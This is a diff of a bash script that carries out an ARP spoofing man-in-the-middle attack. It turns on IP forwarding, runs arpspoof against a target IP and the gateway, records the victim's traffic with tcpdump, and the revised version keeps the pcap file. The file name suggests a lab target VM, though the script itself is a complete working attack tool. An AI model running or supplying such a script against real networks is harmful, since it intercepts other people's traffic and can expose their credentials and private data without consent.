@@ -1,9 +1,10 @@
 #!/bin/bash
 
-# arp_spoof.sh
+# target_vm_arp_spoof.sh
 TARGET_IP=$1
 LOG_FILE="/home/rb/arp_attack_logs.txt"
 GATEWAY_IP="172.30.112.1"  # Adjust to your network
+CAPTURE_FILE="/tmp/arp_capture.pcap"  # Path to capture file
 
 # Function to log messages
 log_message() {
@@ -26,29 +27,26 @@ fi
 echo 1 > /proc/sys/net/ipv4/ip_forward
 log_message "Enabled IP forwarding"
 
-# Start ARP spoofing
+# Start ARP spoofing (assuming arpspoof is installed)
 log_message "Starting ARP spoofing attack against $TARGET_IP"
 timeout 60 arpspoof -i eth0 -t $TARGET_IP $GATEWAY_IP &
 SPOOF_PID=$!
 
-# Monitor and log traffic
-log_message "Starting traffic monitoring"
-tcpdump -i eth0 -w /tmp/captured_traffic.pcap &
+# Start TCP dump to capture traffic
+log_message "Starting traffic capture"
+tcpdump -i eth0 -w $CAPTURE_FILE &
 TCPDUMP_PID=$!
 
-# Run for 5 minutes
+# Run for 60 seconds
 sleep 60
 
 # Cleanup
 kill $SPOOF_PID
 kill $TCPDUMP_PID
+
+# Disable IP forwarding
 echo 0 > /proc/sys/net/ipv4/ip_forward
+log_message "Disabled IP forwarding"
 
-# Analyze results
-log_message "Attack completed. Analyzing captured traffic..."
-tcpdump -r /tmp/captured_traffic.pcap | head -n 10 >> $LOG_FILE
-
-# Cleanup captured file
-rm /tmp/captured_traffic.pcap
-
-log_message "ARP spoofing attack completed"
+# Log the completion and capture file location
+log_message "ARP spoofing attack completed. Captured traffic saved to $CAPTURE_FILE"
